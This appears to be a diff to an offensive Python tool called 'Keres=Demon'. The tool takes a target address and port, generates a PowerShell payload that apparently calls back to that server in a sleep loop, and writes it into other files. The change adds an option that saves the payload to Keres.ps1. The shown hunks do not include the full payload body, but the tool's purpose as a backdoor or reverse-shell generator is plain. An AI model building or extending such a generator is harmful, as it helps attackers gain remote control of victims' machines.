@@ -60,6 +60,7 @@ def main():
     parser = argparse.ArgumentParser(description="Keres=Demon")
     parser.add_argument("-a", "--address", required=True, help="Specify the target address")
     parser.add_argument("-p", "--port", required=True, type=int, help="Specify the target port")
+    parser.add_argument("-Ps", "--save_ps_command", action="store_true", help="Save the PowerShell payload to a Keres.ps1 file in the Output folder")
 
     args = parser.parse_args()
     server_address = args.address
@@ -83,6 +84,15 @@ def main():
         }} 
         Start-Sleep -Seconds 10 
     }}'''
+    if args.save_ps_command:
+        ps_file_path = os.path.join("Output", "Keres.ps1")
+        with open(ps_file_path, 'w') as ps_file:
+            ps_file.write(ps_command)
+        print('\n')
+        print('generated  Powershell command')
+        print('\n')
+        print(f"PowerShell command saved to: {ps_file_path}")
+        return
     if hasattr(sys, '_MEIPASS'):
         bundle_dir = sys._MEIPASS
     else:
@@ -101,7 +111,7 @@ def main():
     with open(paw_path, 'w') as paw_file:
         paw_file.write(new_paw_contents)
 
-# Example usage
+
 
     print('\n')
     print('generated  Powershell command')
